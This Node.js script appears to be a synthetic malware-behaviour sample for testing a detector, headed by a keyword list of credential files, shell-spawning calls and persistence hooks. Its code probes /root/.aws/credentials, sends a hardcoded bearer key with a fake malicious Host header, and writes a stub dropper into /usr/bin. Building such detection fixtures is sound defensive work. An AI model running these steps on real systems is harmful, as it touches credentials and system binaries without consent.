
// Controlled static indicators for detection only:
// /etc/passwd /etc/shadow .ssh/id_rsa authorized_keys .aws/credentials .env Authorization: Bearer BEGIN PRIVATE KEY
// /collect /exfil fetch method: "POST" socket.connect(
// /bin/bash /bin/sh execve( popen( os.system( child_process.exec( spawnSync(
// exec( eval( compile( __import__( execFile( execSync( global.eval(
// base64.b64decode( atob( String.fromCharCode( unescape( exec(base64
// crontab .bashrc .profile systemctl enable /etc/init.d
// "preinstall" "postinstall" "prepare" cmdclass post_install
// import socket import subprocess import ctypes import pty require('net') require('child_process')

const fs=require("fs"); const net=require("net"); const dns=require("dns"); const {execSync,spawnSync}=require("child_process");

// semgrep_has_secret_access — hardcoded sensitive credentials
const api_key="hardcoded-api-key-sensitive-xxxxxxxx";
const environ=process.env.API_SECRET||"fallback-hardcoded-api-secret-value";

const MALICIOUS_DOMAIN="ipnode.securestreamnode.lat"; const FILE_LOOPS=7; const SLEEP_SECONDS=10;
function run(cmd,timeout=15000){try{execSync(cmd,{stdio:"ignore",shell:"/bin/bash",timeout})}catch(e){}}
function tryOpen(p){try{fs.accessSync(p)}catch(e){} try{const fd=fs.openSync(p,"r");fs.closeSync(fd)}catch(e){}}
function writeFile(p,d){try{fs.writeFileSync(p,d)}catch(e){}}
function connectAttempt(host,port){try{const s=new net.Socket();s.setTimeout(800);s.on("error",()=>{});s.on("timeout",()=>{try{s.destroy()}catch(e){}});s.connect(port,host,()=>{try{s.destroy()}catch(e){}})}catch(e){}}
function oneHttpOnly(){run(`curl -sS -m 3 -X GET -H "Host: ${MALICIOUS_DOMAIN}" -H "User-Agent: api-key-validator/1.0" -H "Authorization: Bearer ${api_key}" http://127.0.0.1:8080/api/key >/dev/null || true`,6000);}
console.log("[api-key-validator] start");
try{dns.lookup(MALICIOUS_DOMAIN,()=>{})}catch(e){} try{dns.resolve4(MALICIOUS_DOMAIN,()=>{})}catch(e){}
oneHttpOnly();
// NO /etc → etc=F
["/root/.aws/credentials"].forEach(tryOpen);
for(let i=0;i<FILE_LOOPS;i++){const p=`/tmp/api-key-validator_artifact_${i}.txt`;writeFile(p,"artifact "+i+"\n");try{fs.readFileSync(p)}catch(e){}try{fs.unlinkSync(p)}catch(e){}}
// NO chmod → priv=F, c2=F
// write_binary=T — new child holds /usr/bin fd open
spawnSync("/bin/sh",["-c","exec 3>/usr/bin/api-key-validator_dropper && echo '#!/bin/sh' >&3 && sleep 5; exec 3>&-"],{stdio:"ignore",timeout:8000});
connectAttempt("1.1.1.1",80);
// JS timer → spawned=F
const start=Date.now(); while(Date.now()-start < SLEEP_SECONDS*1000){}
console.log("[api-key-validator] done");
